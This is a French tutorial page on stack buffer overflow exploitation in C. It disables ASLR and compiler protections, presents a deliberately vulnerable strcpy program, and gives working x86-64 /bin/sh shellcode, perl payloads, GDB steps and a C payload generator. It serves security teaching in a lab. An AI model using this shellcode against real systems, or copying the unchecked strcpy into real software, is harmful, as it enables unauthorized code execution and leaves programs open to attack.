---
layout: ../../../layouts/BaseLayout.astro
title: Buffer Overflow
description: A guide in C.
---

# Buffer Overflow - Guide Complet

## Table des matières
1. [Prérequis](#prérequis)
2. [Désactivation des protections](#désactivation-des-protections)
3. [Code vulnérable](#code-vulnérable)
4. [Compilation et protections](#compilation-et-protections)
5. [Création du shellcode](#création-du-shellcode)
6. [Construction du payload](#construction-du-payload)
7. [Analyse avec GDB](#analyse-avec-gdb)
8. [Exploitation](#exploitation)
9. [Automatisation](#automatisation)

## Prérequis

**Environnement :** Linux (Kali Linux recommandé)
**Architecture :** x86-64
**Outils requis :** GCC, GDB, NASM, objdump, checksec

## Désactivation des protections

### ASLR (Address Space Layout Randomization)

Connexion en tant que root :
```bash
sudo su
```

Désactivation de l'ASLR :
```bash
echo 0 > /proc/sys/kernel/randomize_va_space
```

Vérification :
```bash
cat /proc/sys/kernel/randomize_va_space
# Doit retourner : 0
```

## Code vulnérable

Créer le fichier `auth_overflow.c` :

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_authentication(char *password) {
    int auth_flag = 0;
    char password_buffer[16];
    
    strcpy(password_buffer, password);
    
    if(strcmp(password_buffer, "brillig") == 0)
        auth_flag = 1;
    if(strcmp(password_buffer, "outgrabe") == 0)
        auth_flag = 1;
        
    return auth_flag;
}

int main(int argc, char *argv[]) {
    if(argc < 2) {
        printf("Usage %s <password>\n", argv[0]);
        exit(0);
    }
    
    if(check_authentication(argv[1])) {
        printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
        printf(" Access Granted.\n");
        printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
    } else {
        printf("\nAccess Denied.\n");
    }
    
    return 0;
}
```

### Analyse de la vulnérabilité

La faille se situe dans la fonction `check_authentication` :
- Le buffer `password_buffer` fait 16 octets
- La fonction `strcpy()` ne vérifie pas la taille des données copiées
- Un argument trop long provoque un débordement de tampon

## Compilation et protections

### Compilation basique (avec protections)
```bash
gcc -o auth_overflow auth_overflow.c
```

### Vérification des protections
```bash
checksec --file=auth_overflow
```

### Compilation sans protections
```bash
gcc -g -fno-stack-protector -o auth_overflow auth_overflow.c -z execstack -no-pie
```

**Paramètres de compilation :**
- `-g` : Inclut les informations de débogage
- `-fno-stack-protector` : Désactive la protection stack canary
- `-z execstack` : Rend la pile exécutable
- `-no-pie` : Désactive la protection PIE (Position Independent Executable)

### Vérification de la pile exécutable
```bash
readelf -l auth_overflow
```
Rechercher la ligne `GNU_STACK` avec les permissions `RWE` (Read, Write, Execute).

## Création du shellcode

### Code assembleur (shellcode.asm)

```asm
bits 64

section .text
global _start

_start:
    ; Mettre le chemin du shell dans le registre RDI
    xor rax, rax                        ; Met rax à 0
    push rax                            ; Empiler NULL (argv terminator)
    mov rdi, 0x68732f2f6e69622f         ; Mettre "/bin/sh" dans rdi
    push rdi                            ; Empiler "/bin/sh"
    mov rdi, rsp                        ; Mettre l'adresse de "/bin/sh" dans rdi
    xor rsi, rsi                        ; Mettre rsi à 0 (aucun argument)
    xor rdx, rdx                        ; Mettre rdx à 0 (aucun argument)
    mov al, 0x3b                        ; syscall number pour execve (59 en décimal)
    syscall
```

### Correspondance ASCII

La chaîne `/bin/sh` en hexadécimal :
- `0x2f` : /
- `0x62` : b
- `0x69` : i
- `0x6e` : n
- `0x2f` : /
- `0x73` : s
- `0x68` : h

### Compilation du shellcode

```bash
# Assemblage
nasm -f elf64 shellcode.asm -o shellcode.o

# Édition de liens
ld -o shellcode shellcode.o
```

### Extraction du shellcode

```bash
objdump -d shellcode | grep -Po '\s\K[0-9a-f]{2}(?=\s)' | paste -sd '' - | sed 's/\(..\)/\\x\1/g'
```

**Résultat :**
```
\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05
```

### Explication de la commande d'extraction

1. **`objdump -d shellcode`** : Désassemble le fichier exécutable
2. **`grep -Po '\s\K[0-9a-f]{2}(?=\s)'`** : Extrait les octets hexadécimaux
3. **`paste -sd '' -`** : Concatène toutes les lignes
4. **`sed 's/\(..\)/\\x\1/g'`** : Ajoute le préfixe `\x` à chaque octet

## Construction du payload

Le payload se compose de trois parties :
1. **Shellcode** : Code à exécuter
2. **NOP sled** : Instructions `\x90` pour faciliter l'exploitation
3. **Adresse de retour** : Pointe vers le début du shellcode

## Analyse avec GDB

### Lancement du débogueur
```bash
gdb -q ./auth_overflow
```

### Affichage du code source
```bash
(gdb) list 1
```

### Placement d'un breakpoint
```bash
(gdb) b 11
```

### Exécution avec payload de test
```bash
(gdb) r $(perl -e 'print "\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05" . "\x90"x(10)')
```

### Examen de la pile
```bash
(gdb) x/32xw $rsp
```

### Localisation du buffer
```bash
(gdb) x/x password_buffer
```

### Informations sur la frame
```bash
(gdb) info frame
```

### Calcul de l'offset

1. Identifier l'adresse du buffer
2. Identifier l'adresse de retour sauvegardée
3. Calculer la différence pour déterminer le nombre de NOPs nécessaires

### Payload final
```bash
(gdb) r $(perl -e 'print "\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05" . "\x90"x(12) . "\x90\xdd\xff\xff\xff\x7f\x00\x00"')
```

**Note :** L'adresse de retour est en format little-endian.

## Exploitation

### Test hors débogueur
```bash
./auth_overflow $(perl -e 'print "\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05" . "\x90"x(12) . "\xb0\xdd\xff\xff\xff\x7f\x00\x00"')
```

### Vérification du shell
```bash
$ whoami
```

## Automatisation

### Générateur de payload en C

Créer le fichier `payload.c` :

```c
#include <stdio.h>
#include <string.h>

int main() {
    // Définition du shellcode
    unsigned char shellcode[] =
        "\x48\x31\xc0"                              // xor rax, rax
        "\x50"                                      // push rax
        "\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68" // movabs rdi, 0x68732f2f6e69622f
        "\x57"                                      // push rdi
        "\x48\x89\xe7"                              // mov rdi, rsp
        "\x48\x31\xf6"                              // xor rsi, rsi
        "\x48\x31\xd2"                              // xor rdx, rdx
        "\xb0\x3b"                                  // mov al, 0x3b
        "\x0f\x05";                                 // syscall

    // Adresse de retour en little-endian
    unsigned char ret_addr[] = "\xb0\xdd\xff\xff\xff\x7f\x00\x00";

    // Calculer les tailles
    size_t shellcode_size = sizeof(shellcode) - 1;
    size_t ret_addr_size = sizeof(ret_addr) - 1;
    size_t nop_size = 12;

    // Buffer pour le payload
    char buffer[1024];
    memset(buffer, 0x90, sizeof(buffer));

    // Copier le shellcode au début du buffer
    memcpy(buffer, shellcode, shellcode_size);

    // Ajouter des NOPs après le shellcode
    memset(buffer + shellcode_size, 0x90, nop_size);

    // Ajouter l'adresse de retour après les NOPs
    memcpy(buffer + shellcode_size + nop_size, ret_addr, ret_addr_size);

    // Terminer la chaîne
    buffer[shellcode_size + nop_size + ret_addr_size] = '\0';

    // Écrire le payload
    fwrite(buffer, shellcode_size + nop_size + ret_addr_size, 1, stdout);

    return 0;
}
```

### Compilation et utilisation
```bash
gcc -o payload payload.c
./auth_overflow $(./payload)
```

## Considérations importantes

### Architecture de la virtualisation

En environnement virtualisé, les adresses mémoire peuvent commencer par `0x0000f` au lieu de `0xfffff`. Ceci influence l'ordre du payload :

- **Format utilisé :** `[shellcode][nop sled][adresse de retour]`
- **Raison :** Éviter que `strcpy()` s'arrête aux octets nuls de l'adresse de retour

### Sécurité

**⚠️ AVERTISSEMENT :** Ce guide est destiné uniquement à l'apprentissage de la sécurité informatique dans un environnement contrôlé. L'utilisation de ces techniques sur des systèmes non autorisés est illégale.

### Protections modernes

Les systèmes modernes incluent plusieurs protections :
- **ASLR** : Randomisation des adresses
- **Stack Canary** : Détection de corruption de pile
- **NX/DEP** : Pile non-exécutable
- **PIE** : Exécutables à position indépendante

Ces protections rendent l'exploitation plus complexe en conditions réelles.

 *Écrit par : Adrien Troussier 🐜*